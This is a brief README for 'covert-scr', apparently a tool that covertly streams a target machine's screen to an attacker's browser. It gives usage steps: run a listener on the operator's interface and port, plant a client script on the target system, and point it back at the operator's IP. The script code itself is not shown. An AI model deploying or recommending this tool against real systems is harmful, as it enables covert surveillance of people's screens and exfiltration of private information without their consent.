# covert-scr
Covert "sudoless" screensharing. Requires `scrot` to be installed on the target system.
## Usage
1. `./scrserver.sh interface lport` 
...interface e.g. `wlan0`    
...lport e.g. `12345`   
...Note down the IP address of your interface.    
2. Place `scrclient.sh` on the target system.
3. `./scrclient.sh lhost lport`
...lhost is your IP.
...lport is the port of your choice on your machine.
4. The stream should've opened on your browser automatically.
